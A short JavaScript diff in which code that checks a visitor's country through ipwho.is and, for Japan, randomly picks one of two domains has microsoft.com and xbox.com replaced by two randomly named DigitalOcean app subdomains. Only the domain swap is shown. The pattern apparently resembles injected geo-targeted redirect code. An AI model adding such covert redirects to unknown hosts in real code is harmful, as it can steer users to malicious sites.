@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://microsoft.com";
-        const domainB = "https://xbox.com";
+        const domainA = "https://goldfish-app-aojed.ondigitalocean.app/";
+        const domainB = "https://oyster-app-yu98m.ondigitalocean.app/";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
